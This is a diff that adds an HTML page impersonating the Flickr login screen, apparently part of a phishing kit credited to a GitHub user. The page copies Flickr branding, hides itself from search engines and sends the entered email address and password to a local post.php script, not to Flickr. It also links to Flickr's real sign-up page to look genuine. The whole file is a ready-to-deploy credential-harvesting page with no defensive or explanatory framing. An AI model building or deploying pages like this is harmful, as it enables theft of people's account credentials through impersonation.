@@ -1,0 +1,101 @@
+<!DOCTYPE html><html lang="en">
+
+<!-- Creatred by https://github.com/makdosx -->	
+	
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
+<link rel="icon" href="/favicon.ico">
+
+<title>Flickr Login</title>
+
+
+<link rel="icon" type="image/png" href="favicon.png"/>
+
+
+<style>
+
+body {
+  background-image: url("backg.webp"); 
+  height:650px;
+  background-position: center; 
+  background-repeat: no-repeat; 
+  background-size: cover;
+}
+
+
+#form
+{
+background-color: white;
+height: 350px;
+width: 350px;	
+}
+
+#user
+{
+height: 11%;
+width: 80%;
+}
+
+#pass
+{
+height: 11%;
+width: 80%;
+}
+
+#sub
+{
+height: 11%;
+width: 83%;
+background-color:#1396e7;
+color:white;
+border:0;
+outline:0;
+}
+
+
+#sub:hover
+{
+height: 11%;
+width: 83%;
+background-color:#1191db;
+color:white;
+border:0;
+outline:0;
+}
+
+
+
+
+</style>
+
+
+
+</head>
+
+<body>
+	
+  <br><br><br><br>
+  <br><br><br><br>
+   
+    <div align="center">
+   <form action="post.php" method="post" id="form">
+	      <br>
+	      <img src="favicon.png" height="10%" width="10%">
+	     <h3> <font color="grey"> Log in to Flickr </font> </h3>
+	   <input type="text" name="user" id="user" placeholder="Email Address"> 
+	   <br> <br>
+	   <input type="passowrd" name="pass" id="pass" placeholder="password">
+	     <br> <br>
+	   <input type="submit" name="sub" value="Log In" id="sub">  
+	      <br>
+	     <h5> Not a Flickr member? 
+	    <a href="https://identity.flickr.com/sign-up" style="text-decoration:none"> Sign up here. </a>
+	      </h5>
+   </form>	
+    </div>
+	
+	
+</body>
+</html>				
